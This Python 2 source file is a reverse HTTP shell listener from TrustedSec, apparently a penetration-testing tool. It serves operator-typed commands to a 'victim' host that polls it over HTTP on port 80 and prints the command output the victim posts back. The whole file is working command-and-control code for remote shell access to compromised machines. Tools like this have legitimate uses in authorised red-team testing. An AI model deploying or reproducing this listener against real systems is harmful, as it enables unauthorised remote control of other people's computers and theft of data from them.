#!/usr/bin/python
############################################
#
#
# Uncrypted Reverse HTTP Listener by:
#
#        Dave Kennedy (ReL1K)
#     http://www.secmaniac.com
#
#            Modified By:
#        Adam Brown (br0wniE)
#     http://www.coffeegist.com
#
#
############################################
# Copyright 2012 TrustedSec, LLC. All rights reserved.
#
# This piece of software code is licensed under the FreeBSD license..
#
# Visit http://www.freebsd.org/copyright/freebsd-license.html for more information.

from BaseHTTPServer import BaseHTTPRequestHandler
from BaseHTTPServer import HTTPServer
import threading
import urlparse
import re
import os

command_queue = []

# url decode for postbacks
def htc(m):
    return chr(int(m.group(1),16))

# url decode
def urldecode(url):
    rex=re.compile('%([0-9a-hA-H][0-9a-hA-H])',re.M)
    return rex.sub(htc,url)

class CommandThread(threading.Thread):
    def run(self):
        while True:
            command = raw_input("shell> ")

            if (command == "quit"):
                print "Stopping shell... (Press Ctrl+C to exit)"
                break
            elif (len(command.strip()) > 0):
                command_queue.append(command)

class GetHandler(BaseHTTPRequestHandler):

    # handle get request
    def do_GET(self):
        # send a 200 OK response
        self.send_response(200)
        # end headers
        self.end_headers()
        # write our command shell param to victim
        if len(command_queue) > 0:
            self.wfile.write(command_queue.pop(0))
        # return out
        return

    # handle post request
    def do_POST(self):
        # send a 200 OK response
        self.send_response(200)
        # # end headers
        self.end_headers()
        # grab the length of the POST data
        length = int(self.headers.getheader('content-length'))
        # read in the length of the POST data
        qs = self.rfile.read(length)
        # url decode
        message=urldecode(qs)
        # remove the parameter cmd
        message=message.replace("cmd=", "")
        # display the command back decrypted
        print "\n[*] Received output...\n {}".format(message)

    def log_message(self, format, *args):
        return


if __name__ == '__main__':
    server = HTTPServer(('', 80), GetHandler)

    print """
            ############################################
            #
            #
            # Uncrypted Reverse HTTP Listener by:
            #
            #        Dave Kennedy (ReL1K)
            #     http://www.secmaniac.com
            #
            #            Modified By:
            #        Adam Brown (br0wniE)
            #     http://www.coffeegist.com
            #
            #
            ############################################
    """

    print 'Starting unencrypted web shell server, use <Ctrl-C> to stop'
    # simple try block
    try:
    # serve and listen forever
        command_thread = CommandThread()
        command_thread.start()
        server.serve_forever()

    # handle keyboard interrupts
    except KeyboardInterrupt:
        print "[!] Exiting the unencrypted webserver shell..."
    finally:
        server.server_close()
